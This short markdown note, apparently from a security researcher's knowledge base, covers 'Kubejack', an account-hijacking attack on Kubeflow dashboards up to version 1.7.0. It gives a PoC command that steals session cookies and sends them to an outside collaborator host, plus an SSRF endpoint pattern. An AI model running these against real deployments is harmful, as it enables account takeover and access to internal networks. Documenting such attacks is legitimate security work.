---
aliases:
  - kubejack
tags:
  - supply-chain-attack
  - MLops-attack
last_tested: 
transferable: N/A
---
 
## **PoC**
For Kubeflow versions <=1.7.0 

`python Kubejack.py --fetch-cookie --attacker-url 8v4lxpiftcnsgj3pchs8tk8mvd14pwtki.oastify.com --kubeflow-url http://kubeflow.company.com `

https://github.com/protectai/Snaike-Kubeflow/blob/cabc48cc7261c168b338ee7c7eae901c5ba99a2f/Kubejack.py#L4


## **Details**
A python lib with a UI, includes some java. Scales out resources for creating models

- Kubeflow dashboard is a RCE vector like Jupyter notebooks. 
- Lots of basic vulnerabilities present as of 10/2023
- basic SSRF's to be found, at endpoints like `pipeline/artifacts/get?source=minio&namespace=$payload&peek=256&bucket=mlpipeline`  
- Can be present inside or outside a k8s cluster, and can be used as a gateway to internal network.s

	
[Video](https://www.youtube.com/watch?v=_PC4PwSlPT4)
[Paper](https://mlsecops.com/resources/hacking-ai-account-hijacking-and-internal-network-attacks-in-kubeflow) 
Source: twitter.com/danhmcinerney  
### ATT&CK Matrix